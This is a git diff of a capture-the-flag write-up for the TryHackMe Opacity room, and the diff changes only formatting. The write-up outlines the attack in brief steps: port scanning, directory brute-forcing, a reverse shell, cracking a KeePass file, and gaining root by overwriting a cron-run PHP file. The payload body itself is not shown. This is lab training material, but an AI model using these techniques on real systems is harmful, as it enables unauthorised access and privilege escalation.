@@ -10,9 +10,10 @@ mermaid: true
 
 # [**_Opacity room_**](https://tryhackme.com/room/opacity)
 
+## Nmap
 
-## Nmap 
 With rustscan we can see 4 ports 22,80,139,445 are open
+
 ```shell
 NMAP
 PORT    STATE SERVICE     REASON  VERSION
@@ -73,8 +74,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ## Foothold
+
 Dirsearch  
-With dirsearch, we found some interesting 
+With dirsearch, we found some interesting
 
 ```shell  
 [03:24:56] 301 -  314B  - /cloud  ->  http://10.10.230.185/cloud/           
@@ -92,10 +94,9 @@ With dirsearch, we found some interesting
 
 ![](/commons/THM/Opacity2/1.got_rev_shell.png)
 
-
 After enum with **www-data**
 
-Found keepass data file save in __/opt__
+Found keepass data file save in **/opt**
 
 1. Download file to local machine.
 2. User keepass2john > hash
@@ -107,11 +108,13 @@ Found keepass data file save in __/opt__
 **Got the local.txt**
 
 ## PrivEsc
+
 SSH with sysadmin cred.
 
 use pspy ⇒ cronjob
 
 replace /lib/backup.inc.php with file bellow:  
+
 ```php
 <?php
 
@@ -125,9 +128,9 @@ function zipData($source, $destination) {
 }
 ?>
 ```  
-Listen on port 4444 and 
+
+Listen on port 4444 and
 
 ![](/commons/THM/Opacity2/3.root.png)
 
 **Got root.txt**
-
